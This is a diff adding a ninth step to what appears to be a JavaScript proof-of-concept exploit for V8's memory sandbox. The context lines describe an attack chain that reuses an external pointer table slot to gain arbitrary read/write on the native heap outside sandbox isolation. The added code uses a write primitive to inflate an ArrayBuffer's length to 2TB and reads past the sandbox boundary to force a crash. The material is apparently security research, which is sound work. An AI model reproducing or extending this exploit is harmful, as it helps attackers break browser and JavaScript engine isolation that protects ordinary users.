@@ -238,3 +238,32 @@ print('  Attack: write victim.handle → attacker.ept_field (in-sandbox)');
 print('          then free victim → spray spies → spy reuses EPT slot');
 print('          now attacker.DataView → spy\'s backing_store (native C++ heap)');
 print('  Result: arbitrary read/write to native heap outside V8 sandbox isolation\n');
+
+// ── STEP 9: SIGSEGV — read past 1TB sandbox VA end ────────────────────
+banner('STEP 9 — SIGSEGV: Past sandbox VA boundary');
+// SIGBUS  = within sandbox VA (1TB mmap reservation, PROT_NONE gaps)
+// SIGSEGV = past sandbox VA end (truly unmapped kernel address space)
+//
+// backing_store (spy_ptr) is ~2GB into the 1TB sandbox VA.
+// spy_ptr + 1.5TB > sandbox_end → unmapped → SIGSEGV.
+//
+// raw_byte_length (64-bit at curAttackerAddr+0x18) encodes byteLength = raw * 8.
+// wrote 0x40000000 to low32 → raw=0x40000000 → byteLength=8GB.
+// now write 0x40 to high32 (+0x1c) → raw=0x4000000000 → byteLength=2TB.
+
+print('  current byteLength = ' + attacker.byteLength + ' (' + (attacker.byteLength/2**30).toFixed(0) + ' GB)');
+w32(curAttackerAddr + 0x18n, 0x00000000);  // raw low32 = 0
+w32(curAttackerAddr + 0x1cn, 0x00000040);  // raw high32 = 0x40 → raw=0x4000000000 → 2TB
+print('  inflated raw_byte_length high32=0x40 → byteLength = ' + attacker.byteLength + ' bytes');
+
+const SB_END2 = SB_BASE + BigInt(Sandbox.byteLength);
+print('  sandbox VA : [' + hex(SB_BASE) + ', ' + hex(SB_END2) + ')  (1TB)');
+print('  spy_ptr    : SB_BASE + ~2GB  (within sandbox VA)');
+print('  spy_ptr + 1.5TB >> ' + hex(SB_END2) + ' (sandbox end) → SIGSEGV\n');
+
+const dv9 = new DataView(attacker);
+// 1.5 TB offset: 0x18000000000 = 1.5 * 2^40
+const OFF_1_5TB = Number(0x18000000000n);
+print('  reading attacker[0x18000000000] = spy_ptr + 1.5TB ...');
+let sigsegv_val = dv9.getUint32(OFF_1_5TB, true);
+print('  value = ' + hex(sigsegv_val)); // never reached
